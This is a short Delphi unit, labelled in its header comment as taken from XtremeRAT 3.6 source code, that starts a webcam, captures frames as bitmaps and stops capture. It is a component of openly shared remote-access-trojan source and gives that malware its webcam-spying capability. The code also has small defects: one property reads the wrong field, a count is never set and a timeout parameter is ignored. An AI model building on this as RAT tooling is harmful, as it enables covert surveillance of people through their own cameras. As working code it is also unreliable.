unit uCamHelper; //From XtremeRAT 3.6 source code

interface

uses
  Windows, UnitFunctions, Graphics, VFrames;

type
  TCamHelper = class
    constructor Create(Handle: THandle);
    destructor Destroy; override;
  private
    Vid : TVideoImage;
    FCamNumber, FCamCount: Integer;
    FStarted: Boolean;
  public
    function StartCam(CamNumber: Integer; Resolution: Integer = 0): Boolean;
    procedure StopCam;
    function GetImage(BMP: TBitmap; Timeout: Cardinal = INFINITE): Boolean;
    property Started: Boolean read FStarted;
    property CamNumber: Integer read FCamCount;
    property CamCount: Integer read FCamCount;
  end;

var
  CamHelper: TCamHelper;

implementation

constructor TCamHelper.Create(Handle: THandle);
begin
  FCamNumber := 0;
  Vid := TVideoImage.Create(Handle);                               
end;

function TCamHelper.StartCam(CamNumber: Integer; Resolution: Integer = 0): Boolean;
begin
  Result := False;
  if Started and (FCamNumber = CamNumber) then Exit;
  StopCam;
  FStarted := Vid.VideoStart('#' + IntToStr(CamNumber), Resolution - 1);
  if Started then FCamNumber := CamNumber;
  Result := Started;
end;

function TCamHelper.GetImage(BMP: TBitmap; Timeout: Cardinal = INFINITE): Boolean;
begin
  Result := False;
  if not Started then Exit;
  if Vid.HasNewFrame(1000) and FStarted then Result := Vid.GetBitmap(BMP);
end;

procedure TCamHelper.StopCam;
begin
  if Vid.VideoRunning then Vid.VideoStop;
  FStarted := False;
end;

destructor TCamHelper.Destroy;
begin
  Vid.Free;
end;

end.
